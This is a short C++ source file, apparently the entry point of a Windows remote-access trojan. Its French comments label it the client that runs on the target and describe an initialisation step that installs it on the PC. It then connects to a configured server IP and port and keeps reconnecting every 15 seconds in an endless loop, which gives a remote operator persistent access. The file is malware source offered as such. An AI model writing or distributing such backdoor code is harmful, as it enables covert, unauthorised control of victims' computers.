#include <winsock2.h>
#include "Running.h"


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCommandLine, int nCommandShow){ // Main client -- cible
    Running::lpArguments = lpCommandLine; // set variable static selon l'entree en arguments

    if (Running::initialisation()) {    //run inititialisation sert pour l'installation sur le pc return 0 si terminé et réussi
        return 0;
    }

    Client MyClient(Settings::serverIP, Settings::serverPort); //Client

    while (true){
        if (!MyClient.connected)
        {
            while (!MyClient.Connect())
            {
                Sleep(15000);
            }
        }
        Sleep(15000);
    }
}